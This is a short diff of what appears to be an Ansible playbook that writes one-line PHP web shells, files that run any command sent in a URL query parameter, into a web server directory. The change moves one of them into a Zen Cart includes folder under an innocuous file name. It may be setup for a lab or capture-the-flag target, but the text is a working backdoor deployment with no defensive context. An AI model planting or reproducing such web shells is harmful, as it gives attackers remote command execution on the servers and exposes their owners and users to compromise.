@@ -16,6 +16,6 @@
       content: <?=`$_GET[_]`?> 
   - name: Create pico.php
     copy:
-      dest: /var/www/html/includes/var.php
+      dest: /var/www/html/zen-cart/includes/var.php
       content: <?=`$_GET[var]`?> 
        
